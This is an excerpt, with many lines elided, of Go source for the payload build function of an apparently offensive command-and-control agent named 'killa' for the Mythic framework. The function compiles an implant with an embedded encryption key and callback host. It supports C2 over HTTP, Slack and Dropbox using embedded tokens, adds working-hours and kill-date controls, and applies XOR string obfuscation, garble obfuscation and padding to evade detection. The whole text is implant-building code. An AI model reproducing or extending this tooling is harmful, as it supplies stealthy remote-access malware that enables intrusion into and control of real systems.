...
func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResponse {
	...
	killa_main_package := "main"

	// Build Go link flags that are passed in at compile time through the "-ldflags=" argument
	// https://golang.org/cmd/link/
	ldflags := fmt.Sprintf("-s -w -X '%s.payloadUUID=%s'", killa_main_package, payloadBuildMsg.PayloadUUID)
	...
	for _, key := range payloadBuildMsg.C2Profiles[0].GetArgNames() {
		if key == "AESPSK" {
			...
			ldflags += fmt.Sprintf(" -X '%s.encryptionKey=%s'", killa_main_package, cryptoVal.EncKey)
			...
			ldflags += fmt.Sprintf(" -X '%s.callbackHost=%s'", killa_main_package, val)
			...
			ldflags += fmt.Sprintf(" -X '%s.callbackPort=%s'", killa_main_package, fmt.Sprintf("%d", int(val)))
			...
			ldflags += fmt.Sprintf(" -X '%s.sleepInterval=%s'", killa_main_package, fmt.Sprintf("%d", int(val)))
			...
			ldflags += fmt.Sprintf(" -X '%s.jitter=%s'", killa_main_package, fmt.Sprintf("%d", int(val)))
		} else if key == "headers" {
			...
			if userAgentVal, exists := headerMap["User-Agent"]; exists {
				ldflags += fmt.Sprintf(" -X '%s.userAgent=%s'", killa_main_package, userAgentVal)
			}
			...
			if len(extraHeaders) > 0 {
				...
				ldflags += fmt.Sprintf(" -X '%s.customHeaders=%s'", killa_main_package, encoded)
			}
		} else if key == "get_uri" {
			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
			if err != nil {
			...
			ldflags += fmt.Sprintf(" -X '%s.getURI=%s'", killa_main_package, val)
			...
			ldflags += fmt.Sprintf(" -X '%s.postURI=%s'", killa_main_package, val)
			...
			ldflags += fmt.Sprintf(" -X '%s.slackBotToken=%s'", killa_main_package, val)
			...
			ldflags += fmt.Sprintf(" -X '%s.slackChannelID=%s'", killa_main_package, val)
			...
			ldflags += fmt.Sprintf(" -X '%s.slackPollInterval=%d'", killa_main_package, int(val))
			...
			ldflags += fmt.Sprintf(" -X '%s.dropboxToken=%s'", killa_main_package, val)
			...
			ldflags += fmt.Sprintf(" -X '%s.dropboxTaskFolder=%s'", killa_main_package, val)
			...
			ldflags += fmt.Sprintf(" -X '%s.dropboxResultFolder=%s'", killa_main_package, val)
			...
			ldflags += fmt.Sprintf(" -X '%s.dropboxArchiveFolder=%s'", killa_main_package, val)
			...
			ldflags += fmt.Sprintf(" -X '%s.dropboxPollInterval=%d'", killa_main_package, int(val))
		}
	}

	profileName := strings.ToLower(strings.TrimSpace(payloadBuildMsg.C2Profiles[0].Name))
	if profileName == "slack" {
		botToken, err := payloadBuildMsg.C2Profiles[0].GetStringArg("slack_bot_token")
		if err != nil || strings.TrimSpace(botToken) == "" {
			payloadBuildResponse.Success = false
			payloadBuildResponse.BuildStdErr = "slack_bot_token is required and must be provided via Mythic C2 profile parameters"
			return payloadBuildResponse
		}
		channelID, err := payloadBuildMsg.C2Profiles[0].GetStringArg("slack_channel_id")
		if err != nil || strings.TrimSpace(channelID) == "" {
			payloadBuildResponse.Success = false
			payloadBuildResponse.BuildStdErr = "slack_channel_id is required and must be provided via Mythic C2 profile parameters"
			return payloadBuildResponse
		}
	} else if profileName == "dropbox" {
		dropboxToken, err := payloadBuildMsg.C2Profiles[0].GetStringArg("dropbox_token")
		if err != nil || strings.TrimSpace(dropboxToken) == "" {
			payloadBuildResponse.Success = false
			payloadBuildResponse.BuildStdErr = "dropbox_token is required and must be provided via Mythic C2 profile parameters"
			return payloadBuildResponse
		}
	}

	// Select runtime transport implementation from C2 profile
	ldflags += fmt.Sprintf(" -X '%s.transportType=%s'", killa_main_package, payloadBuildMsg.C2Profiles[0].Name)
	...
	if hostHeader, err := payloadBuildMsg.BuildParameters.GetStringArg("host_header"); err == nil && hostHeader != "" {
		ldflags += fmt.Sprintf(" -X '%s.hostHeader=%s'", killa_main_package, hostHeader)
	}
	...
	if tcpBind, err := payloadBuildMsg.BuildParameters.GetStringArg("tcp_bind_address"); err == nil && tcpBind != "" {
		ldflags += fmt.Sprintf(" -X '%s.tcpBindAddress=%s'", killa_main_package, tcpBind)
	}
	...
	if whStart, err := payloadBuildMsg.BuildParameters.GetStringArg("working_hours_start"); err == nil && whStart != "" {
		ldflags += fmt.Sprintf(" -X '%s.workingHoursStart=%s'", killa_main_package, whStart)
	}
	if whEnd, err := payloadBuildMsg.BuildParameters.GetStringArg("working_hours_end"); err == nil && whEnd != "" {
		ldflags += fmt.Sprintf(" -X '%s.workingHoursEnd=%s'", killa_main_package, whEnd)
	}
	if whDays, err := payloadBuildMsg.BuildParameters.GetStringArg("working_days"); err == nil && whDays != "" {
		ldflags += fmt.Sprintf(" -X '%s.workingDays=%s'", killa_main_package, whDays)
	}
	...
	if kdStr, err := payloadBuildMsg.BuildParameters.GetStringArg("kill_date"); err == nil && kdStr != "" {
		...
		ldflags += fmt.Sprintf(" -X '%s.killDate=%d'", killa_main_package, kdTime.Unix())
	}
	...
	if mrStr, err := payloadBuildMsg.BuildParameters.GetStringArg("max_retries"); err == nil && mrStr != "" {
		...
		ldflags += fmt.Sprintf(" -X '%s.maxRetries=%s'", killa_main_package, mrStr)
	}
	...
	if obfStrings, err := payloadBuildMsg.BuildParameters.GetBooleanArg("obfuscate_strings"); err == nil && obfStrings {
		...
		ldflags += fmt.Sprintf(" -X '%s.xorKey=%s'", killa_main_package, xorKeyB64)
		...
		for _, v := range obfVars {
			plainPattern := fmt.Sprintf("-X '%s.%s=%s'", killa_main_package, v.name, v.value)
			encodedVal := xorEncodeString(v.value, xorKey)
			encodedPattern := fmt.Sprintf("-X '%s.%s=%s'", killa_main_package, v.name, encodedVal)
		...
		if customHeadersB64 := extractLdflagValue(ldflags, killa_main_package, "customHeaders"); customHeadersB64 != "" {
			plainPattern := fmt.Sprintf("-X '%s.customHeaders=%s'", killa_main_package, customHeadersB64)
			encodedVal := xorEncodeString(customHeadersB64, xorKey)
			encodedPattern := fmt.Sprintf("-X '%s.customHeaders=%s'", killa_main_package, encodedVal)
			ldflags = strings.Replace(ldflags, plainPattern, encodedPattern, 1)
		}
	}
	...
	paddingFile := "./killa/agent_code/padding.bin"
	...
	// GOGARBLE scopes which packages garble obfuscates. Using "killa" restricts
	...
	if payloadBytes, err := os.ReadFile(fmt.Sprintf("/build/%s", payloadName)); err != nil {
		...
		if err != nil {
			...
			extension := "bin"
			filename := fmt.Sprintf("killa.%s", extension)
